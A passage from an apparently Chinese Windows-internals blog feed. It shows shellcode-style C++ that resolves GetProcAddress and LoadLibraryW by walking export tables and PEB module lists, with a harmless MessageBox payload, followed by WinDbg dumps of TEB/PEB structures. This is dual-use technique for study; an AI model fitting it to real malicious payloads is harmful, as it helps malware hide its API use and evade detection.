pwAddressOfNames = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD64)pKernelBase);</span><br><span class="line"><span class="comment">// 获取函数序号表</span></span><br><span class="line">   PWORD pwAddressOfNameOrdinals = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD64)pKernelBase);</span><br><span class="line">   <span class="comment">// 获取函数名称总数</span></span><br><span class="line">DWORD dwNumberOfNames = pExport-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line">DWORD64 dwGetProcAddress = <span class="number">0</span>;</span><br><span class="line">   <span class="comment">// 通过函数名称总数遍历</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dwNumberOfNames; i++)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="comment">// 获取函数名</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* szFuncName = (<span class="type">char</span>*)(pwAddressOfNames[i] + (DWORD64)pKernelBase);</span><br><span class="line"><span class="comment">// 局部变量</span></span><br><span class="line"><span class="type">char</span> szGetProcAddress[] = &#123;<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>&#125;;</span><br><span class="line"><span class="type">int</span> nFlags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; <span class="number">14</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (szFuncName[j] == szGetProcAddress[j])</span><br><span class="line">&#123;</span><br><span class="line">nFlags++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nFlags == <span class="number">14</span>)</span><br><span class="line">&#123;</span><br><span class="line">dwGetProcAddress = (DWORD64)(pwAddressOfFunctions[pwAddressOfNameOrdinals[i]] + (DWORD64)pKernelBase);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="定义相关函数字符串以及函数原型并调用-1"><a href="#定义相关函数字符串以及函数原型并调用-1" class="headerlink" title="定义相关函数字符串以及函数原型并调用"></a>定义相关函数字符串以及函数原型并调用</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// 定义LoadLibraryW字符串</span></span><br><span class="line">   <span class="type">char</span> szLoadLibraryW[] = &#123; <span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// 定义MessagesBoxW字符串</span></span><br><span class="line"><span class="type">char</span> szMessagesBoxW[] = &#123; <span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">   <span class="comment">// 定义KERNEL32.dll字符串</span></span><br><span class="line"><span class="type">char</span> szKernel32[] = &#123; <span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">   <span class="comment">// 定义ExitProcss字符串</span></span><br><span class="line"><span class="type">char</span> szExitProcss[] = &#123; <span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">WCHAR szUser32[] = &#123; <span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">WCHAR szDokey[] = &#123; <span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI* MyLoadLibraryW)</span><span class="params">(_In_ LPCWSTR lpLibFileName)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* MyGetProcAddress)</span><span class="params">(_In_ HMODULE hModule, _In_ LPCSTR lpProcName)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI* MyMessageBoxW)</span><span class="params">(_In_opt_ HWND hWnd, _In_opt_ LPCWSTR lpText, _In_opt_ LPCWSTR lpCaption, _In_ UINT uType)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span><span class="params">(WINAPI* MyExitProcess)</span><span class="params">(_In_ UINT uExitCode)</span></span>;</span><br><span class="line">HMODULE hKernel = (HMODULE)pKernelBase;</span><br><span class="line"></span><br><span class="line">MyGetProcAddress pFuncGetProcAddress = (MyGetProcAddress)dwGetProcAddress;</span><br><span class="line"><span class="keyword">if</span> (pFuncGetProcAddress == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">MyLoadLibraryW pFuncLoadLibraryW = (MyLoadLibraryW)<span class="built_in">pFuncGetProcAddress</span>(hKernel, szLoadLibraryW);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == pFuncLoadLibraryW)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">HMODULE hUser32 = <span class="built_in">pFuncLoadLibraryW</span>((LPCWSTR)szUser32);</span><br><span class="line">MyMessageBoxW pFuncMessageBoxW = (MyMessageBoxW)<span class="built_in">pFuncGetProcAddress</span>(hUser32, szMessagesBoxW);</span><br><span class="line"><span class="built_in">pFuncMessageBoxW</span>(<span class="literal">NULL</span>, szDokey, (LPCWSTR)szDokey, MB_OK);</span><br><span class="line">MyExitProcess pFuncExitProcess = (MyExitProcess)<span class="built_in">pFuncGetProcAddress</span>(hKernel, szExitProcss);</span><br><span class="line"><span class="built_in">pFuncExitProcess</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows进程环境块分析</title>
      <link href="/a214807a.html"/>
      <url>/a214807a.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>TEB</strong></p><p>TEB(Thread Environment Block), <code>线程环境变量块</code>, TEB中包含了线程的堆栈指针、TLS（线程本地存储）指针、异常处理链表指针、用户模式分页表指针等信息。TEB中<code>fs寄存器</code>通常被设置为<code>fs:[0]</code>（32位）, 指向当前线程的的TEB结构体。其他线程可以通过访问自己的TEB结构体来获取自己的状态和信息。</p></div><div class="note info"><p><strong>PEB</strong></p><p>PEB(Process Environment Block), <code>进程环境变量块</code>, PEB中包含了进程的代码、数据段指针、进程的环境变量、进程启动参数信息以及加载的dll信息等。PEB结构体中的<code>fs段寄存器</code>通常被设置为<code>0x30</code>（32位）, 指向当前进程的PEB结构体。</p></div><span id="more"></span><h2 id="TEB的查找方式"><a href="#TEB的查找方式" class="headerlink" title="TEB的查找方式"></a>TEB的查找方式</h2><table><thead><tr><th align="left">32 bit</th><th align="left">64 bit</th></tr></thead><tbody><tr><td align="left">fs</td><td align="left">gs</td></tr></tbody></table><h2 id="32位TEB-PEB查找"><a href="#32位TEB-PEB查找" class="headerlink" title="32位TEB&#x2F;PEB查找"></a>32位TEB&#x2F;PEB查找</h2><h3 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _TEB</span><br><span class="line">ntdll!_TEB</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> EnvironmentPointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> ClientId         : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x028</span> ActiveRpcHandle  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x02c</span> ThreadLocalStoragePointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB      <span class="comment">// &lt;== 指向PEB</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h3><blockquote><p>包含进程信息</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _PEB</span><br><span class="line">ntdll!_PEB</span><br><span class="line">   +<span class="number">0x000</span> InheritedAddressSpace : UChar</span><br><span class="line">   +<span class="number">0x001</span> ReadImageFileExecOptions : UChar</span><br><span class="line">   +<span class="number">0x002</span> BeingDebugged    : UChar</span><br><span class="line">   +<span class="number">0x003</span> BitField         : UChar</span><br><span class="line">   +<span class="number">0x003</span> ImageUsesLargePages : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsProtectedProcess : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsImageDynamicallyRelocated : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> SkipPatchingUser32Forwarders : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsPackagedProcess : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsAppContainer   : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsProtectedProcessLight : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> IsLongPathAwareProcess : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> Mutant           : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> ImageBaseAddress : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> Ldr              : Ptr32 _PEB_LDR_DATA        <span class="comment">// &lt;=== 指向PEB_LDR_DATA</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="PEB-LDR-DATA"><a href="#PEB-LDR-DATA" class="headerlink" title="PEB_LDR_DATA"></a>PEB_LDR_DATA</h3><blockquote><p>包含有关为进程加载的模块的信息</p></blockquote><h4 id="PEB-LDR-DATA结构定义"><a href="#PEB-LDR-DATA结构定义" class="headerlink" title="PEB_LDR_DATA结构定义"></a>PEB_LDR_DATA结构定义</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_PEB_LDR_DATA</span> &#123;</span><br><span class="line">  BYTE       Reserved1[<span class="number">8</span>];                  <span class="comment">// 保留供操作系统内部使用</span></span><br><span class="line">  PVOID      Reserved2[<span class="number">3</span>];                  <span class="comment">// 保留供操作系统内部使用</span></span><br><span class="line">  LIST_ENTRY InMemoryOrderModuleList;       <span class="comment">// 包含进程的已加载模块的双向链表, 链表中的每个项都是指向LDR_DATA_TABLE_ENTRY结构的指针</span></span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure><h4 id="LIST-ENTRY-结构体定义"><a href="#LIST-ENTRY-结构体定义" class="headerlink" title="LIST_ENTRY 结构体定义"></a>LIST_ENTRY 结构体定义</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> &#123;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Flink;</span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">_LIST_ENTRY</span> *Blink;</span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure><blockquote><p>_LIST_ENTRY: 这个双向链表指向进程装载的模块, 结构中每个指针, 指向了一个<code>LDR_DATA_TABLE_ENTRY</code>的结构;</p></blockquote><h4 id="LDR-DATA-TABLE-ENTRY-结构定义"><a href="#LDR-DATA-TABLE-ENTRY-结构定义" class="headerlink" title="LDR_DATA_TABLE_ENTRY 结构定义"></a>LDR_DATA_TABLE_ENTRY 结构定义</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_LDR_DATA_TABLE_ENTRY</span></span><br><span class="line">&#123;</span><br><span class="line">     LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">     LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">     LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">     PVOID DllBase;</span><br><span class="line">     PVOID EntryPoint;</span><br><span class="line">     ULONG SizeOfImage;</span><br><span class="line">     UNICODE_STRING FullDllName;</span><br><span class="line">     UNICODE_STRING BaseDllName;</span><br><span class="line">     ULONG Flags;</span><br><span class="line">     WORD LoadCount;</span><br><span class="line">     WORD TlsIndex;</span><br><span class="line">     <span class="keyword">union</span></span><br><span class="line">     &#123;</span><br><span class="line">          LIST_ENTRY HashLinks;</span><br><span class="line">          <span class="keyword">struct</span></span><br><span class="line">          &#123;</span><br><span class="line">               PVOID SectionPointer;</span><br><span class="line">               ULONG CheckSum;</span><br><span class="line">          &#125;;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="keyword">union</span></span><br><span class="line">     &#123;</span><br><span class="line">          ULONG TimeDateStamp;</span><br><span class="line">          PVOID LoadedImports;</span><br><span class="line">     &#125;;</span><br><span class="line">     _ACTIVATION_CONTEXT * EntryPointActivationContext;</span><br><span class="line">     PVOID PatchInformation;</span><br><span class="line">     LIST_ENTRY ForwarderLinks;</span><br><span class="line">     LIST_ENTRY ServiceTagLinks;</span><br><span class="line">     LIST_ENTRY StaticLinks;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure><h4 id="查询PEB-LDR-DATA"><a href="#查询PEB-LDR-DATA" class="headerlink" title="查询PEB_LDR_DATA"></a>查询PEB_LDR_DATA</h4><blockquote><p>在遍历<code>InMemoryOrderModuleList</code>时, 地址需要<code>-0x08</code></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _PEB_LDR_DATA</span><br><span class="line">ntdll!_PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x000</span> Length           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> Initialized      : UChar</span><br><span class="line">   +<span class="number">0x008</span> SsHandle         : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> InLoadOrderModuleList : _LIST_ENTRY               <span class="comment">// &lt;=== 模块加载的顺序</span></span><br><span class="line">   +<span class="number">0x014</span> InMemoryOrderModuleList : _LIST_ENTRY             <span class="comment">// &lt;=== 模块在内存的顺序</span></span><br><span class="line">   +<span class="number">0x01c</span> InInitializationOrderModuleList : _LIST_ENTRY     <span class="comment">// &lt;=== 模块在内存的顺序</span></span><br><span class="line">   +<span class="number">0x024</span> EntryInProgress  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x028</span> ShutdownInProgress : UChar</span><br><span class="line">   +<span class="number">0x02c</span> ShutdownThreadId : Ptr32 Void</span><br></pre></td></tr></table></figure><h4 id="查询LDR-DATA-TABLE-ENTRY"><a href="#查询LDR-DATA-TABLE-ENTRY" class="headerlink" title="查询LDR_DATA_TABLE_ENTRY"></a>查询LDR_DATA_TABLE_ENTRY</h4><blockquote><p>以<code>InLoadOrderLinks </code>为示例</p></blockquote><h5 id="获取主模块（程序自身）"><a href="#获取主模块（程序自身）" class="headerlink" title="获取主模块（程序自身）"></a>获取主模块（程序自身）</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt -r1 <span class="number">0x014b41d8</span> _LDR_DATA_TABLE_ENTRY</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY [ <span class="number">0x14b40c0</span> - <span class="number">0x77eceb2c</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x014b40c0</span> _LIST_ENTRY [ <span class="number">0x14b45d0</span> - <span class="number">0x14b41d8</span> ]</span><br><span class="line">      +<span class="number">0x004</span> Blink            : <span class="number">0x77eceb2c</span> _LIST_ENTRY [ <span class="number">0x14b41d8</span> - <span class="number">0x14b4810</span> ]</span><br><span class="line">   +<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY [ <span class="number">0x14b40c8</span> - <span class="number">0x77eceb34</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x014b40c8</span> _LIST_ENTRY [ <span class="number">0x14b45d8</span> - <span class="number">0x14b41e0</span> ]</span><br><span class="line">      +<span class="number">0x004</span> Blink            : <span class="number">0x77eceb34</span> _LIST_ENTRY [ <span class="number">0x14b41e0</span> - <span class="number">0x14b4818</span> ]</span><br><span class="line">   +<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY [ <span class="number">0x0</span> - <span class="number">0x0</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : (null) </span><br><span class="line">      +<span class="number">0x004</span> Blink            : (null) </span><br><span class="line">   +<span class="number">0x018</span> DllBase          : <span class="number">0x00d80000</span> Void            <span class="comment">// Dll基址</span></span><br><span class="line">   +<span class="number">0x01c</span> EntryPoint       : <span class="number">0x00dce118</span> Void</span><br><span class="line">   +<span class="number">0x020</span> SizeOfImage      : <span class="number">0x126000</span></span><br><span class="line">   +<span class="number">0x024</span> FullDllName      : _UNICODE_STRING <span class="string">&quot;D:\\xxx\\EnumModule.exe&quot;</span>      <span class="comment">// 第一个模块为程序自身</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0xb2</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0xb4</span></span><br><span class="line">      +<span class="number">0x004</span> Buffer           : <span class="number">0x014b27dc</span>  <span class="string">&quot;D:\\xxx\\EnumModule.exe&quot;</span></span><br><span class="line">   +<span class="number">0x02c</span> BaseDllName      : _UNICODE_STRING <span class="string">&quot;EnumModule.exe&quot;</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0x1c</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0x1e</span></span><br><span class="line">      +<span class="number">0x004</span> Buffer           : <span class="number">0x014b2872</span>  <span class="string">&quot;EnumModule.exe&quot;</span></span><br><span class="line">   +<span class="number">0x034</span> FlagGroup        : [<span class="number">4</span>]  <span class="string">&quot;???&quot;</span></span><br><span class="line"></span><br><span class="line">略... </span><br></pre></td></tr></table></figure><h5 id="获取NtDll"><a href="#获取NtDll" class="headerlink" title="获取NtDll"></a>获取NtDll</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt -r1 <span class="number">0x14b40c0</span> _LDR_DATA_TABLE_ENTRY</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY [ <span class="number">0x14b45d0</span> - <span class="number">0x14b41d8</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x014b45d0</span> _LIST_ENTRY [ <span class="number">0x14b49c0</span> - <span class="number">0x14b40c0</span> ]</span><br><span class="line">      +<span class="number">0x004</span> Blink            : <span class="number">0x014b41d8</span> _LIST_ENTRY [ <span class="number">0x14b40c0</span> - <span class="number">0x77eceb2c</span> ]</span><br><span class="line">   +<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY [ <span class="number">0x14b45d8</span> - <span class="number">0x14b41e0</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x014b45d8</span> _LIST_ENTRY [ <span class="number">0x14b49c8</span> - <span class="number">0x14b40c8</span> ]</span><br><span class="line">      +<span class="number">0x004</span> Blink            : <span class="number">0x014b41e0</span> _LIST_ENTRY [ <span class="number">0x14b40c8</span> - <span class="number">0x77eceb34</span> ]</span><br><span class="line">   +<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY [ <span class="number">0x14b49d0</span> - <span class="number">0x77eceb3c</span> ]</span><br><span class="line">      +<span class="number">0x000</span> Flink            : <span class="number">0x014b49d0</span> _LIST_ENTRY [ <span class="number">0x14b45e0</span> - <span class="number">0x14b40d0</span> ]</span><br><span class="line">      +<span class="number">0x004</span> Blink            : <span class="number">0x77eceb3c</span> _LIST_ENTRY [ <span class="number">0x14b40d0</span> - <span class="number">0x14b4820</span> ]</span><br><span class="line">   +<span class="number">0x018</span> DllBase          : <span class="number">0x77da0000</span> Void            <span class="comment">// &lt;=== 指向ntdll.dll的基址</span></span><br><span class="line">   +<span class="number">0x01c</span> EntryPoint       : (null) </span><br><span class="line">   +<span class="number">0x020</span> SizeOfImage      : <span class="number">0x1b2000</span></span><br><span class="line">   +<span class="number">0x024</span> FullDllName      : _UNICODE_STRING <span class="string">&quot;C:\\WINDOWS\\SYSTEM32\\ntdll.dll&quot;</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0x3a</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0x3c</span></span><br><span class="line">      +<span class="number">0x004</span> Buffer           : <span class="number">0x014b3fa0</span>  <span class="string">&quot;C:\\WINDOWS\\SYSTEM32\\ntdll.dll&quot;</span></span><br><span class="line">   +<span class="number">0x02c</span> BaseDllName      : _UNICODE_STRING <span class="string">&quot;ntdll.dll&quot;</span></span><br><span class="line">      +<span class="number">0x000</span> Length           : <span class="number">0x12</span></span><br><span class="line">      +<span class="number">0x002</span> MaximumLength    : <span class="number">0x14</span></span><br><span class="line">      +<span class="number">0x004</span> Buffer           : <span class="number">0x77dab4f8</span>  <span class="string">&quot;ntdll.dll&quot;</span></span><br><span class="line">   +<span class="number">0x034</span> FlagGroup        : [<span class="number">4</span>]  <span class="string">&quot;???&quot;</span></span><br><span class="line"></span><br><span class="line">略...</span><br></pre></td></tr></table></figure><h5 id="获取Kernel32"><a href="#获取Kernel32" class="headerlink" title="获取Kernel32"></a>获取Kernel32</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 